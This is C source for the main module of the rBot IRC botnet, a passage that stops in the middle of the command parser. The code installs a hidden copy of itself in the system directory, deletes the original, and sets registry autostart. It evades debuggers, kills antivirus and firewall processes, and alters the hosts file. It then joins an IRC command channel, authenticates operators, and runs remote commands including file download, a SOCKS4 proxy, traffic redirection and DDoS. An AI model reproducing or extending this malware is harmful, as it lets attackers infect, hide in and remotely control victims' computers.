/* 

  rBot

*/

#include "includes.h"
#include "functions.h"
#include "configs.h"
#include "passwd.h"
#include "globals.h"
#include "externs.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;

	#ifndef _DEBUG
	#ifndef NO_EHANDLER
	// install exception handler
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           // Build EXCEPTION_REGISTRATION record:
        push    handler         // Address of handler function
        push    FS:[0]          // Address of previous handler
        mov     FS:[0],ESP      // Install new EXCEPTION_REGISTRATION
    }
	#endif
	#endif

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif

	#ifndef NO_CRYPT // Don't decrypt password here
	decryptstrings();
	#endif

	LoadDLLs(); // load all the dlls and functions here

	#ifndef _DEBUG
	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
	#endif

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, false, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	#ifndef _DEBUG
	#ifndef NO_ANTIDEBUG
	bool IsDebuggerPresent = DetectDebuggers();
	if (IsDebuggerPresent) { /*send a personalized message, then exit*/
		OutputDebugString(message);
		ExitProcess(EXIT_FAILURE);
	}
	#endif
	#endif

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		ExitProcess(EXIT_FAILURE);
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		ExitProcess(EXIT_FAILURE);
	}

	
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(0, cfilename, sizeof(cfilename)); // cfilename -> <directory>/<fname><.ext>
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext); // rfilename -> <fname><.ext>

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH], *exts[]={
			".exe",
			".pif",
			".scr",
			".cmd",
			".bat"
		};
		
		// our hidden filename
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename));i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s%s", sysdir, filename, exts[randnum(sizeof(exts)/sizeof(exts[0]))]);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		bool bFileCheck=false;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=true; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo; memset(&pinfo, 0, sizeof(pinfo));
		STARTUPINFO sinfo; memset(&sinfo, 0, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
	#endif

	#ifndef NO_MELT
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited 
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(cfilename);

	sprintf(logbuf,"[MAIN]: Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    #ifndef NO_AVFW_KILL
	sprintf(logbuf,"[PROCS]: AV/FW Killer active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"[PROCS]: Failed to start AV/FW killer thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

    #ifndef NO_SECSYSTEM
	sprintf(logbuf,"[SECURE]: System secure monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"[SECURE]: Failed to start secure thread, error: <%d>.", GetLastError());
	addlog(logbuf);
	#endif

	sprintf(logbuf,"[SECURE]: Aborting crashes caused by exploits.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AbortCrash, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"[SECURE]: Failed to start secure thread, error: <%d>.", GetLastError());
	addlog(logbuf);

    #ifndef NO_REGISTRY
	sprintf(logbuf,"[SECURE]: Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"[SECURE]: Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

	#ifndef NO_IDENT
	if (findthreadid(IDENT_THREAD) == 0) {
		sprintf(logbuf,"[IDENTD]: Server running on Port: 113."); 
		i = addthread(logbuf,IDENT_THREAD,NULL);
		if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
			sprintf(logbuf,"[IDENTD]: Failed to start server, error: <%d>.", GetLastError()); 
		addlog(logbuf);
	}
	#endif

	#ifndef NO_HOSTCHANGE
	ChgHosts();
	#endif
	#ifndef NO_VIRUSREMOVE
	removevirus();
	#endif

	// set version while bot is running
    current_version=randnum(versionsize);

	int current_server=0;
	strncpy(mainirc.host, servers[0], sizeof(mainirc.host));
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel));
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass));
	mainirc.spy = 0;

	while (true) {
		#ifndef NO_CONNCHECK
		DWORD cstat;
		if (!nowininet) { 
			while (fInternetGetConnectedState(&cstat, 0) == FALSE) 
				Sleep(30000); 
		}
		#endif

		#ifdef DEBUG_CONSOLE
		printf("Attempting to connect to %s.\n", mainirc.host);
		#endif

		if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
			break; // break out of the loop

		if (current_server < serversize) current_server++; 
		if (current_server == serversize) current_server = 0;
		strncpy(mainirc.host, servers[current_server], sizeof(mainirc.host)-1);
		Sleep(FLOOD_DELAY);
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval=0;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = true;

	while (true) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == INADDR_NONE) 
			break;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			break;
		}

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif
		addlogv("[MAIN]: Connected to %s.", irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][MAXIDENT], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, false), nick1);

	#ifdef DEBUG_LOGGING
	debuglog(login,false);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = IRC_ProtocolParse(lines[j], sock, server, channel, chanpass, nick1, host, masters, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int IRC_ProtocolParse(char *line, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *host, char masters[MAXLOGINS][MAXIDENT], int *in_channel, int repeat, int clone)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE];
	char *a[MAXTOKENS], user[MAXIDENT], *ptr;

	int i=0, s=3;

	DWORD id=0;
	bool ismaster = false;

	strncpy(line1, line, sizeof(line1));
	for (a[i++] = strtok(line1, " "); i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	/*
	Just so this is clear... there are about 4 possible reasons for a ping timeout from a bot: 

	1. The computer has been shut down abruptly. 
	2. The bot's internet connection is very lagged. 
	3. The bot has been disconnected from the internet. 
	4. The bot has crashed. 
	*/
	if (strcmp("PING", a[0]) == 0) {
		irc_sendv(sock, "PONG %s\r\n", a[1]); 
		irc_sendv(sock, "PONG %s %s\r\n", a[1]+1, a[1]); /*-> PONG <servername> :<servername> (from mIRC)*/
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	if (a[0][0] == ':') {
		strncpy(user, a[0]+1, sizeof(user));
		strtok(user, "!");
	} else
		return 1;

	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a[0]) == 0)
			ismaster = true;
	}

	//if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("TOPIC", a[1]) == 0 && topiccmd)) {
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (a[2] == NULL || a[3] == NULL) 
			return 1;

		//if (strcmp("TOPIC", a[1]) == 0 && clone != 0) 
		//	return 1;
	
		if (a[2][0] != '#' || strcmp("NOTICE",a[1]) == 0) 
			a[2] = user;

		if (++a[3] && nick) {
			s = (strncmp(nick, a[3], strlen(nick)) == 0)?(4):(3);
			if (a[s] == NULL) 
				return 1;

			if (a[s][0] == prefix && clone == 0) {
				a[s]++;
				return (IRC_CommandParse(line,a,s,sock,server,channel,chanpass,nick,user,host,masters,ismaster,repeat));
			}

			if (strcmp("\1VERSION\1", a[s]) == 0) {
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);

					return 1;
				}
			}
			else if (strcmp("\1PING", a[s]) == 0) {
				if (a[s+1] && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
			}
			#ifndef NO_DCC
			else if (strcmp("\1DCC", a[s]) == 0) { 
				if (strcmp("SEND", a[s+1]) == 0) {
					if (ismaster) {
						DCC dcc;
						strcpy(dcc.filename,a[s+2]);
						strcpy(dcc.host,a[s+3]);
						dcc.port = (unsigned short)atoi(a[s+4]);
						dcc.sock = sock;
						strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
						dcc.notice = false;
						dcc.silent = false;

						_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Receive file: '%s' from user: %s.", dcc.filename,dcc.sendto);
						dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
						if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCGetThread, (LPVOID)&dcc, 0, &id)) {
							while (dcc.gotinfo == false) 
								Sleep(50);
						} else 
							_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Failed to start transfer thread, error: <%d>.", GetLastError());
					} else 
						_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Receive file: '%s' failed from unauthorized user: %s.", a[s+2], user);
					addlog(sendbuf);
				}
				#ifndef NO_REMOTECMD
				else if (strcmp("CHAT", a[s+1]) == 0) {
					if (ismaster) {
						if (findthreadid(DCCCHAT_THREAD) == 0) {
							DCC dcc;
							strncpy(dcc.host,a[s+3],sizeof(dcc.host));
							dcc.port = (unsigned short)atoi(a[s+4]);
							dcc.sock = sock;
							strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
							dcc.notice = false;
							dcc.silent = false;

							_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Chat from user: %s.", user);
							dcc.threadnum=addthread(sendbuf,DCCCHAT_THREAD,NULL);
							if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCChatThread, (LPVOID)&dcc, 0, &id)) {
								while (dcc.gotinfo == false) 
									Sleep(50);
							} else
								_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Failed to start chat thread, error: <%d>.", GetLastError());
						} else
							_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Chat already active with user: %s.",user);
					} else
						_snprintf(sendbuf,sizeof(sendbuf),"[DCC]: Chat failed by unauthorized user: %s.",user);
					addlog(sendbuf);
				}
				#endif

				return 1;
			}
			#endif
		}
	}
	else if (strcmp("KICK", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if ((strncmp(masters[i], a[0], strlen(masters[i])) == 0) || (strcmp(user,a[3]) == 0)) {
					masters[i][0] = '\0';
					_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: User: %s logged out.", user);
					irc_sendv(sock, "NOTICE %s :%s\r\n", user, sendbuf);
					addlog(sendbuf);

					break;
				}
			}
		}
		if (strcmp(nick, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		} 

		return 1;
	}
	else if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strncmp(masters[i], a[0], strlen(masters[i])) == 0) {
					masters[i][0] = '\0';

					_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: User: %s logged out.", user);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0]+1, sendbuf);
					addlog(sendbuf);

					return 1;
				}
			}
		}
	}
	else if (strcmp("NICK", a[1]) == 0) {
		if(strcmp(user, nick) == 0)
			_snprintf(nick,MAXNICKLEN,a[2]+1);
		else {
			for (i = 0; i < MAXLOGINS; i++) {
				if (masters[i][0]) {
					if (strcmp(masters[i],a[0]) == 0) {
						char *identhost = strchr(a[0],'!');
						if (identhost && (strlen(a[2]+1) + strlen(identhost) < MAXIDENT)) {
							_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Master: %s changed identity to: .",masters[i],a[0]+1);
							_snprintf(masters[i],MAXIDENT,":%s%s",a[2]+1,identhost);
						} else
							_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Failed to change nick for Master: %s.",masters[i]);
						addlog(sendbuf);

						break;
					}
				}
			}
		}

		return 1;
	}
	else if ((i=atoi(a[1])) != 0) {
		switch (i) {
		case 0:
			break;

		case 001:
			irc_sendv(sock, "USERHOST %s\r\n", nick);
			#ifndef NO_MODEONCONN
			irc_sendv(sock, "MODE %s %s\r\n", nick, modeonconn);
			#else
			irc_sendv(sock, "MODE %s +i\r\n", nick);
			#endif
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

			success = true;

			break;

		case 302:
			ptr = strstr(a[3], "@");
			if (ptr != NULL) 
				strncpy(host, ptr+1, MAXHOSTNAME);

			break;

		case 332:
			if (a[4]) {
				if (a[4][1] == prefix && clone == 0) {
					char *b[MAXTOKENS];
					int rval;

					ptr = strstr(line, " :");
					ptr += 2;
					strncpy(sendbuf, ptr, sizeof(sendbuf));

					b[i=0] = strtok(sendbuf, "|");
					for (i=1;b[i] = strtok(NULL,"|"); i++)
						while (b[i][0] == ' ')
							b[i]++;

					i=0, rval=0;
					while (b[i]) {
						strncpy(line2, line, sizeof(line2));
						ptr = strstr(line2, " :");
						ptr += 2;
						strcpy(ptr, b[i]);

						strncpy(line1,line2,sizeof(line1));

						a[0] = strtok(line1, " ");
						for (int j = 1; j < MAXTOKENS; j++) 
							a[j] = strtok(NULL, " ");
						a[s = 4]+=2;
						a[2] = a[3];

						Sleep(100);
						rval = IRC_CommandParse(line2,a,s,sock,server,channel,chanpass,nick,user,host,masters,ismaster,repeat);
						if (b[++i]) Sleep(FLOOD_DELAY);
					}
					return (rval);
				}
			}

			break;

		case 353:
			if (strcmp(channel, a[4]) == 0)
				*in_channel = 1;
			addlogv("[MAIN]: Joined channel: %s.", a[4]);

			break;

		case 433:
			char nickbuf[MAXNICKLEN];
			memset(nickbuf,0,sizeof(nickbuf));
			rndnick(nickbuf, nicktype, nickprefix);
			irc_sendv(sock,"NICK %s\r\n",nickbuf);

			break;

		default:
			break;
		}
	}


	return 1;
}


int IRC_CommandParse(char *line, char *a[MAXTOKENS], int s, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *user, char *host, char masters[MAXLOGINS][MAXIDENT], bool ismaster, int repeat) {
	char line1[IRCLINE], sendbuf[IRCLINE], ntmp[12], ntmp2[3];

	int i, j;
	DWORD id=0;

	unsigned char parameters[256];
	memset(parameters,0,sizeof(parameters));
	for (i = (MAXTOKENS - 1); i >= 0; i--) {
		if (a[i]) {
			if ((a[i][0] == '-') && (a[i][2] == 0)) {
				parameters[a[i][1]] = 1 ;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			} else 
				break;
		}
	}

	bool silent = (parameters['s'])?(true):(false);
	bool notice = (strcmp("NOTICE", a[1]) == 0 || parameters['n'])?(true):(false);
	if (notice && strcmp("332",a[1]) != 0)
		a[2] = user;

	char a0[MAXIDENT];
	strncpy(a0,  a[0], sizeof(a0)-1);

	// see if someone is logging in
	if (strcmp("h4sh1n", a[s]) == 0) {
		if ((a[s+2] && strcmp(a[s+2],botid) != 0) || a[s+1] == NULL || ismaster || strcmp("332", a[1]) == 0 || strcmp("TOPIC", a[1]) == 0) 
			return 1;

		char *u = strtok(a[0], "!"), *h = strtok(NULL, "\0");
		h = strtok(h, "~");

		bool nick_ok = false;

		if (authnick[0][0] == '\0') nick_ok = true;
		else {
			#ifndef NO_CRYPT
			Crypt((unsigned char *)user, strlen(user),NULL,0);
			#endif
			for (i=0; i < authsize; i++) {
				if (_stricmp(authnick[i], user) == 0) nick_ok = true; /*case insensitive*/
				//if (strcmp(authnick[i], user) == 0) nick_ok = true; /*case sensitive*/
			}
			#ifndef NO_CRYPT
			Crypt((unsigned char *)user, strlen(user),NULL,0);
			#endif
		}

		#ifndef NO_CRYPT
		Crypt((unsigned char *)a[s+1],strlen(a[s+1]),NULL,0);
		#endif
		if (!nick_ok || strcmp(password, a[s+1]) != 0) {
			irc_sendv(sock, "NOTICE %s :Authentication failed (%s!%s). Error: %d\r\n", user, user, h, (!nick_ok)?(1):(2));
			irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
			addlogv("[MAIN]: *Failed authentication by: (%s!%s). Error: %d", user, h, (!nick_ok)?(001):(002));
			return 1;
		}

		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') {
				strncpy(masters[i], a0, sizeof(a0)-1);
				if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Password accepted.", notice);
				addlogv("[MAIN]: User: %s logged in.", user);

				return 1;
			}
		}

		_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Failed to login user: %s, too many logins already.", user); 
		if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
		addlog(sendbuf);

		return 1;
	}

	if ((ismaster || strcmp("332", a[1]) == 0)) {
		bool usevars = false;

		strncpy(line1, line, sizeof(line1));
		char *x = strstr(line1, " :");

		// commands requiring no parameters
		// check if the command matches an alias's name

		for (i = 0; i < anum; i++) {
			if (strcmp(aliases[i].name, a[s]) == 0) {
				char *sc = strstr(line, " :");
				if (sc == NULL) return 1;
				sc[2] = prefix;
				sc[3] = prefix;
				strncpy(sc+4, aliases[i].command, 159);

				// process '$x-' parameter variables
				for (j=15; j > 0; j--) {
					sprintf(ntmp, "$%d-", j);
					if (strstr(line, ntmp) != NULL && a[s+j+1] != NULL) {
						x = x + strlen(aliases[i].name);
						if (x != NULL) {
							char *y = strstr(x, a[s+j]);
							if (y != NULL) replacestr(line, ntmp, y);
						}
					}
					else if (a[s+j+1] == NULL) {
						strncpy(ntmp2, ntmp, 2);
						ntmp2[2] = '\0';
						replacestr(line, ntmp, ntmp2);
					}
				}

				// process '$x' parameter variables
				for (j=16; j > 0; j--){
					sprintf(ntmp, "$%d", j);
					if (strstr(line, ntmp) != NULL && a[s+j] != NULL) 
						replacestr(line, ntmp, a[s+j]);
				}

				usevars = true;
				break;
			}
		}

		if (a[s][0] == prefix || usevars) {
			// process variables
			replacestr(line, "$me", nick); // bot's nick
			replacestr(line, "$user", user); // user's nick
			replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
			replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
			replacestr(line, "$server", server); // name of current server

			// process '$chr()' variables
			while (strstr(line, "$chr(") != NULL) {
				char *c = strstr(line, "$chr(");
				strncpy(ntmp, c+5, 4);
				strtok(ntmp, ")");
				if (ntmp[0] < 48 || ntmp[0] > 57) 
					strncpy(ntmp, "63", 3);
				if (atoi(ntmp) > 0) 
					ntmp2[0] = (char)atoi(ntmp); 
				else 
					ntmp2[0] = (char)((rand()%96) + 32);
				ntmp2[1] = '\0';
				j = strlen(ntmp);
				memset(ntmp, 0, sizeof(ntmp));
				strncpy(ntmp, c, j+6);
				replacestr(line, ntmp, ntmp2);
			}

			// re-split the line into seperate words
			strncpy(line1, line, sizeof(line1));
			a[0] = strtok(line1, " ");
			for (i = 1; i < MAXTOKENS; i++) 
				a[i] = strtok(NULL, " ");
			if (a[s] == NULL) 
				return 1;
			a[s] += 3;
			if (strcmp("332", a[1]) == 0) 
				a[2] = a[3];

			x = strstr(line, " :");
		}

		if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
			rndnick(nick, nicktype, ((parameters['p'])?(true):(false)), a[s+1]);
			irc_sendv(sock, "NICK %s\r\n", nick);

			addlogv("[MAIN]: Random nick change: %s",nick);

			return repeat;
		}
		else if (strcmp("cl0se", a[s]) == 0) {
			if (strcmp(a[s+1],rmpassword) == 0) {
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				killthreadall();
				ExitProcess(EXIT_SUCCESS);
			}
		}
		else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
			if (a[s+1]) {
				i = atoi(a[s+1]);
				if(i >= 0 && i < MAXLOGINS) {
					if(masters[i][0] != '\0') {
						sprintf(sendbuf, "[MAIN]: User %s logged out.", masters[i]+1);
						masters[i][0] = '\0';
					} else
						sprintf(sendbuf, "[MAIN]: No user logged in at slot: %d.", i);
				} else
					sprintf(sendbuf, "[MAIN]: Invalid login slot number: %d.", i);				
			} else {
				for (i = 0; i < MAXLOGINS; i++) 
					if (strcmp(masters[i], a[0]) == 0) {
						masters[i][0] = '\0';
						sprintf(sendbuf, "[MAIN]: User %s logged out.", user);
						break;
					}
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#ifndef NO_BOTVERSION
		else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
			sprintf(sendbuf, "[MAIN]: %s", version);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#endif
		#ifndef NO_SECURE
		else if (strcmp("secure", a[s]) == 0 || strcmp("sec", a[s]) == 0 
			|| strcmp("unsecure", a[s]) == 0 || strcmp("unsec", a[s]) == 0) {
				SECURE secure;
				secure.secure = (strcmp("secure",a[s])==0 || strcmp("sec",a[s])==0);
				strncpy(secure.chan, a[2], sizeof(secure.chan));
				secure.sock = sock;
				secure.notice = notice;
				secure.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"[SECURE]: %s system.", ((secure.secure)?("Securing"):("Unsecuring")));
				secure.threadnum = addthread(sendbuf, SECURE_THREAD, NULL);
				if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id)) {
					while (secure.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[SECURE]: Failed to start secure thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return 1;
			}
		#endif
		#ifndef NO_SOCK4SERV
		else if (strcmp("socks4", a[s]) == 0 || strcmp("s4", a[s]) == 0) {
			SOCKS4 socks4;
			socks4.port = ((a[s+1])?((atoi(a[s+1])==0)?(socks4port):(atoi(a[s+1]))):(socks4port));
			((a[s+2])?(_snprintf(socks4.userid,sizeof(socks4.userid),a[s+2])):
					((parameters['a'])?(_snprintf(socks4.userid,sizeof(socks4.userid),user)):(socks4.userid[0]='\0')));
			socks4.sock = sock;
			socks4.notice = notice;
			socks4.silent = silent;
			strncpy(socks4.chan,a[2],sizeof(socks4.chan));

			sprintf(sendbuf, "[SOCKS4]: Server started on: %s:%d.", GetIP(sock), socks4.port);
			socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
			if (threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &Socks4Thread, (LPVOID)&socks4, 0, &id)) {
				while(socks4.gotinfo == false)
					Sleep(50);
			} else
				addlogv("[SOCKS4]: Failed to start server thread, error: <%d>.", GetLastError());

			return 1;
		}
		else if (strcmp("socks4stop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[SOCKS4]","Server",SOCKS4_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_RLOGIND
		else if (strcmp("rloginstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[RLOGIND]","Server",RLOGIN_THREAD,a[s+1]);

			return 1;
		}
		#endif
		else if (strcmp("httpstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[HTTPD]","Server",HTTP_THREAD,a[s+1]);

			return 1;
		}
		else if (strcmp("logstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[LOG]","Log list",LOG_THREAD,a[s+1]);

			return 1;
		}
		else if (strcmp("redirectstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[REDIRECT]","TCP redirect",REDIRECT_THREAD,a[s+1]);

			return 1;
		}
		#ifndef NO_DDOS
		else if (strcmp("ddos.stop",a[s]) == 0) {
